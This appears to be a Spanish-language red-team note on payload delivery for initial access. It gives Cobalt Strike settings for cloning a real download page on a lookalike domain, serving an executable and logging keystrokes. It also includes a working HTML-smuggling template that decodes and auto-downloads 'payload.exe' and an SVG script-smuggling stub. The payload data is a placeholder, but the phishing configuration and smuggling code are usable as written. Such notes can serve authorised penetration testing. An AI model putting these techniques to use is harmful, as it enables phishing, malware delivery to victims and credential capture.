---
tags: [initial-access, delivery, cobalt-strike, html-smuggling]
status: done
platform: windows
---

# Delivery — Entrega del Payload

> Formas de hacer llegar el payload al objetivo.

---

## Clones con Cobalt Strike

Clonar una web legítima y embeber una URL que el navegador de la víctima descargará automáticamente.

### 1. Hostear el archivo

**Site Management > Host File**

| Campo | Valor |
|-------|-------|
| File | Payload inicial (ej. ejecutable) |
| Local URI | `/dl/windows/utilities/system-information/g/gpu-z/GPU-Z.2.22.0.exe` |
| Local Host | Dominio lookalike apuntando a la IP del team server / redirector |
| Local Port | Puerto de escucha |
| Mime Type | Dejar en automático (detecta por extensión) |

Una vez hosteado aparece en **Site Management > Manage** → seleccionar fila → **Copy URL**.

### 2. Clonar el sitio

**Management > Clone Site**

| Campo | Valor |
|-------|-------|
| Clone URL | Página exacta a clonar (ej. `https://www.bleepingcomputer.com/download/gpu-z/`) |
| Local URI | URI donde el team server servirá la copia (mejor igualar al original) |
| Local Host / Port | Igual que arriba |
| Attack | Recurso hosteado en paso anterior (botón `...`) |
| Log keystrokes | Activa si la página clonada tiene formulario de login |

Resultado: URL que enviar a la víctima.

---

## HTML Smuggling

El payload se embebe en Base64 dentro de un HTML. El navegador lo decodifica y descarga sin tocar el disco hasta el momento de la descarga.

> ⚠️ El contenido del payload es visible en texto claro en el HTML.

```html
<html>
  <body>
    <button onclick="downloadFile()">Download</button>
    <script>
      function convertFromBase64(base64) {
        let binary_string = window.atob(base64);
        let len = binary_string.length;
        let bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
          bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes.buffer;
      }

      function downloadFile() {
        const file = 'VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        const fileName = 'payload.exe';
        let data = convertFromBase64(file);
        let blob = new Blob([data], {type: 'octet/stream'});
        const a = document.createElement('a');
        document.body.appendChild(a);
        a.style = 'display: none';
        const url = window.URL.createObjectURL(blob);
        a.href = url;
        a.download = fileName;
        a.click();
        window.URL.revokeObjectURL(url);
      }
    </script>
  </body>
</html>
```

---

## SVG Smuggling

Archivo `.svg` que ejecuta JavaScript para descargar el payload.

```html
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="4" fill="none" />
  <script>
    alert('Hello World');
  </script>
</svg>
```
